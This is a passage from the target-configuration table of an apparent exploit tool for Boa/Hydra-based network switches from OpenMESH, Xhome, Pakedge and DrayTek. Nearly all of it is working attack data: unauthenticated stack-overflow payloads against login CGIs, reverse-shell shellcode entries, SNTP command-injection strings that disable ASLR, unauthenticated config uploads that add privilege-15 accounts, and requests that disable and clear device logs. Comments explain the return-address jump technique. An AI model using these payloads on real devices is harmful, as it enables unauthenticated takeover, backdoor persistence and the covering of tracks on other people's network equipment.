						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
						'query':'username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&login=1',
						'workaround':True,	# My LAB workaround
						'stack':True, # False = use Heap, and there are no ASLR
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'OpenMESH': { 
				'vendor': 'Open Mesh, Inc.',
				'modulus_uri':'',
				'info_leak':True,
				'info_leak_JSON':False,
				'info_leak_uri':'/loginMsg.js',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'',
					'login_uri':'',
					'query':'',
					'status_uri':'',
					'logout_uri':'',
					'vulnerable': False,
					'safe': True
				},
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'',
					'login_uri':'',
					'query':'',
					'status_uri':'',
					'logout_uri':'',
					'vulnerable': False,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'',
						'disable_query':'',
						'status':'',
						'clean_logfile_uri':'',
						'clean_logfile_query':'',
						'clean_logmem_uri':'',
						'clean_logmem_query':'',
						'vulnerable': False,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'security.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/security.cgi?login',
							'content':'usr=admin&pswrd=' + self.random_string(280),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'datajson.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/datajson.cgi?login',
							'content':'usr=admin&pswrd=' + self.random_string(288),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/sn_httpupload.cgi?', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'',
						'content':'',
						'add_uri':'',
						'del_query':'',
						'del_uri':'',
						'vulnerable': False,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,	# <================================
						'enable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'enable_query':'{"_ds=1&sntpStatus=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
						'inject_uri':'/cgi/set.cgi?cmd=sys_timeSntp',
						'inject_query':'{"_ds=1&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123&_de=1":{}}',
						'check_query':'{"_ds=1&srvDef=byIp&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123&_de=1":{}}',
						'delete_uri':'/cgi/set.cgi?cmd=sys_timeSntpDel',
						'delete_query':'{"":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'disable_query':'{"_ds=1&sntpStatus=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': True, # It is vulnerable, but I am not using this authenticated code here :>
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					# Bonus: Disable and clean logs
					#
					#
					'stack_cgi_add_account': {
						'description':'Stack overflow in "username/password" (PoC: add priv 15 credentials)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_del_account': {
						'description':'Stack overflow in "username/password" (PoC: del priv 15 credentials)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',
						'verify_uri':'/conf_tmp/check',

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'log_settings_set_cmd':'&en=0',				# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'&ta=0',					# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

						'log_fileClear_cmd':'&ta=1',				# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/datajson.cgi?login',
						'content':'usr='+ self.random_string(324)+ '_JUMP_&pswrd='+ self.random_string(284) +'_CMD_',

						'sys_timeSntp_set_cmd':'&sa=`echo 0 > /proc/sys/kernel/randomize_va_space`&sp=123',
						'sys_timeSntp_set_check':'&sa=`cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check`&sp=123',

						'sys_timeSntpDel_set_cmd':'&sa=+&sp=123',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sn=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sn=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/conf_tmp/check',
						'vulnerable': True,
						'safe': True
					}, 
					#
					# Used for both 'heap' and 'stack'
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/security.cgi?login',
						'logout_uri':'/cgi-bin/security.cgi?logout',
						'query':'build=NOP&heap=NOP&to=NOP&higher=addresses&usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
						'stack':False, # False = use Heap, and there are no ASLR
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'Xhome': {
				'vendor': 'Xhome',
				'modulus_uri':'',
				'info_leak':False,
				'info_leak_JSON':False,
				'info_leak_uri':'',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':False,
					'encryption':'clear',
					'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
					'query':'username=USERNAME&password=PASSWORD&login=1',
					'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
					'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':False,
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'LOGGING_SERVICE=0&cmd=5121',
						'status':'',
						'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logfile_query':'cmd_5132=Clear+file+messages',
						'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logmem_query':'cmd_5132=Clear+buffered+messages',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': {
						'httpuploadbakcfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadbakcfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadruncfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httprestorecfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'Image Signature Error',
							'vulnerable': True,
							'safe': True
						},
						'dispatcher.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'response':'502',
							'Content-Type':False,
							'authenticated': False,
							'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
							'content':'username=admin&password='+ self.random_string(184) + '&login=1',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'json':False,
						'authenticated': False,
						'encryption':'md5',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" secret encrypted PASSWORD\n\n------',
						'add_uri':'/cgi-bin/httpuploadruncfg.cgi',
						'del_query':'', 
						'del_uri':'/cgi-bin/dispatcher.cgi?cmd=524&usrName=USERNAME',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':False,
						'authenticated': True,
						'enable_uri':'/cgi-bin/dispatcher.cgi',
						'enable_query':'sntp_enable=1&cmd=548',
						'status_uri':'',
						'inject_uri':'/cgi-bin/dispatcher.cgi',
						'inject_query':'sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123&cmd=550',
						'check_query':'sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123&cmd=550',
						'delete_uri':'/cgi-bin/dispatcher.cgi',
						'delete_query':'sntp_Server=+&sntp_Port=123&cmd=550',
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'sntp_enable=0&cmd=548',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'&login=1&_CMD_',
						'sys_ping_post_check':'',
						'sys_ping_post_SIGSEGV': False,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround

						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',

						'log_settings_set_cmd':'&LOGGING_SERVICE=0',# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'',						# Clean RAM log CMD
						'log_ramClear_SIGSEGV':False,				# Clean RAM log SIGSEGV ?

						'log_fileClear_cmd':'',						# Clean FILE log CMD
						'log_fileClear_SIGSEGV':False,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',

						'sys_timeSntp_set_cmd':'&sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123',
						'sys_timeSntp_set_check':'&sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123',

						'sys_timeSntpDel_set_cmd':'&sntp_Server=+&sntp_Port=123',

						'sys_timeSettings_set_cmd_enable':'&sntp_enable=1',
						'sys_timeSettings_set_cmd_disable':'&sntp_enable=0',
						'sys_timeSettings_set_SIGSEGV': False,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': False,
						'safe': True
					}, 

					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
						'query':'username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&login=1',
						'workaround':True,	# My LAB workaround
						'stack':True, # False = use Heap, and there are no ASLR
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'Pakedge': { 
				'vendor': 'Pakedgedevice & Software Inc',
				'uri':'https://www.pakedge.com/products/switches/family/index.php',
				'modulus_uri':'/cgi/get.cgi?cmd=home_login',
				'info_leak':True,
				'info_leak_JSON':True,
				'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
				'xsid':False,
				'xsid_uri':'/cgi/get.cgi?cmd=home_main',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'rsa',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
					'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
					'logout_uri':'/cgi/set.cgi?cmd=home_logout',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'/cgi/set.cgi?cmd=log_global',
						'disable_query':'{"_ds=1&empty=1&_de=1":{}}',
						'status':'/cgi/get.cgi?cmd=log_global',
						'clean_logfile_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logfile_query':'{"_ds=1&target=1&_de=1":{}}',
						'clean_logmem_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logmem_query':'{"_ds=1&target=0&_de=1":{}}',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httpuploadruncfg.cgi',
							'check_uri':'/tmp/http_saverun_cfg',
							'content':'/var/config/running-config',
							'content_check':'/var/config/running-config',
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httprestorecfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/mnt/startup-config',
							'content_check':'/mnt/startup-config',
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'/tmp/http_uploadfail',
							'content':'Copy: Illegal software format', # Not the real content, its the result of invalid firmware (workaround)
							'content_check':'Copy: Illegal software format',
							'vulnerable': True,
							'safe': True
						},
						'login.cgi': {
							'description':'Stack overflow in login.cgi (PoC: create file /tmp/VUL.TXT)',
							'authenticated': False,
							'response':'file',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'check_uri':'/tmp/VUL.TXT', # We cannot control the content...
							'content':'{"_ds=1&username='+ self.random_string(40) +'&password='+ '/' * 23 +'/tmp/VUL.TXT&_de=1":{}}',
							'content_check':'2',
							'vulnerable': True,
							'safe': True
						},
						'set.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'clear',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
						'add_uri':'/cgi/httpuploadruncfg.cgi',
						'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
						'del_uri':'/cgi/set.cgi?cmd=sys_acctDel',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,
						'enable_uri':'/cgi/set.cgi?cmd=sys_time',
						'enable_query':'{"_ds=1&sntp=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_time',
						'inject_uri':'/cgi/set.cgi?cmd=sys_time',
						'inject_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&_de=1":{}}',
						'check_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&_de=1":{}}',
						'delete_uri':'/cgi/set.cgi?cmd=sys_time',
						'delete_query':'{"_ds=1&sntp=1&timezone=0&srvDef=ipv4&srvHost=+&port=139&dlsType=0&_de=1":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_time',
						'disable_query':'{"_ds=1&sntp=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {	# Not vulnerable 
						'vulnerable': False,
					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',

						#'log_settings_set_cmd':'&logState=1&consoleState=1&ramState=1&fileState=1',	# Enable Logging CMD
						'log_settings_set_cmd':'&empty=1',			# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'&target=0',				# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

						'log_fileClear_cmd':'&target=1',			# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
						'sys_timeSntp_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139',
						'sys_timeSntp_set_check':'&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139',

						'sys_timeSntpDel_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=+&port=139',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sntp=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sntp=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					}, 
					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'logout_uri':'/cgi/set.cgi?cmd=home_logout',
						'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
						'stack':True, # False = use Heap, and there are no ASLR
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'DrayTek': { 
				'vendor': 'DrayTek Corp.',
				'modulus_uri':'/cgi/get.cgi?cmd=home_login',
				'info_leak': True,
				'info_leak_JSON':True,
				'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
				'xsid':False,
				'xsid_uri':'/cgi/get.cgi?cmd=home_main',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'rsa',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
					'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
					'logout_uri':'/cgi/set.cgi?cmd=home_logout',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'/cgi/set.cgi?cmd=log_global',
						'disable_query':'{"_ds=1&empty=1&_de=1":{}}',
						'status':'/cgi/get.cgi?cmd=log_global',
						'clean_logfile_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logfile_query':'{"_ds=1&target=1&_de=1":{}}',
						'clean_logmem_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logmem_query':'{"_ds=1&target=0&_de=1":{}}',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httpuploadruncfg.cgi',
							'check_uri':'/tmp/http_saverun_cfg',
							'content':'/var/config/running-config',
							'content_check':'/var/config/running-config',
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httprestorecfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/mnt/startup-config',
							'content_check':'/mnt/startup-config',
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'/tmp/http_uploadfail',
							'content':'Copy: Illegal software format', # Not the real content, its the result of invalid firmware (workaround)
							'content_check':'Copy: Illegal software format',
							'vulnerable': True,
							'safe': True
						},
						'login.cgi': {
							'description':'Stack overflow in login.cgi (PoC: create file /tmp/VUL.TXT)',
							'authenticated': False,
							'response':'file',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'check_uri':'/tmp/VUL.TXT', # We cannot control the content...
							'content':'{"_ds=1&username='+ self.random_string(40) +'&password='+ '/' * 23 +'/tmp/VUL.TXT&_de=1":{}}',
							'content_check':'1',
							'vulnerable': True,
							'safe': True
						},
						'set.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'clear',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
						'add_uri':'/cgi/httpuploadruncfg.cgi',
						'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
						'del_uri':'/cgi/set.cgi?cmd=sys_acctDel',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,
						'enable_uri':'/cgi/set.cgi?cmd=sys_time',
						'enable_query':'{"_ds=1&sntp=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_time',
						'inject_uri':'/cgi/set.cgi?cmd=sys_time',
						'inject_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&_de=1":{}}',
						'check_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&_de=1":{}}',
						'delete_uri':'/cgi/set.cgi?cmd=sys_time',
						'delete_query':'{"_ds=1&sntp=1&timezone=0&srvDef=ipv4&srvHost=+&port=139&dlsType=0&_de=1":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_time',
						'disable_query':'{"_ds=1&sntp=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {	# Not vulnerable 
						'vulnerable': False,
					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',

						#'log_settings_set_cmd':'&logState=1&consoleState=1&ramState=1&fileState=1',	# Enable Logging CMD
						'log_settings_set_cmd':'&empty=1',			# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'&target=0',				# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

